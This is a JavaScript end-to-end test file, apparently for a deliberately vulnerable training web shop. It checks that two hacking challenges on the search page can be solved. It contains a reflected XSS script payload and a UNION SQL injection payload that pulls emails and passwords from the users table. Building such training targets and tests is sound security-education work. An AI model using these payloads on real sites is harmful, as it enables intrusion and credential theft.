'use strict';

describe('/#/search', function () {

    var searchQuery, searchButton;

    beforeEach(function () {
        browser.get('/#/search'); // not really necessary as search field is part of navbar on every dialog
        searchQuery = element(by.model('searchQuery'));
        searchButton = element(by.id('searchButton'));
    });

    describe('challenge "xss1"', function () {

        it('search query should be susceptible to reflected XSS attacks', function () {
            searchQuery.sendKeys('<script>alert("XSS1")</script>');
            searchButton.click();

            browser.switchTo().alert().then(function (alert) {
                expect(alert.getText()).toEqual('XSS1');
                alert.accept();
            });

        });

        protractor.expect.challengeSolved({challenge: 'xss1'});

    });

    describe('challenge "unionSqlI"', function () {

        it('search query should be susceptible to UNION SQL injection attacks', function () {
            searchQuery.sendKeys('\')/**/union/**/select/**/null,id,email,password,null,null,null/**/from users--');
            searchButton.click();

            var productDescriptions = element.all(by.repeater('product in products').column('description'));
            expect(productDescriptions.first().getText()).toMatch(/admin@juice-sh.op/);
        });

        protractor.expect.challengeSolved({challenge: 'unionSqlI'});

    });

});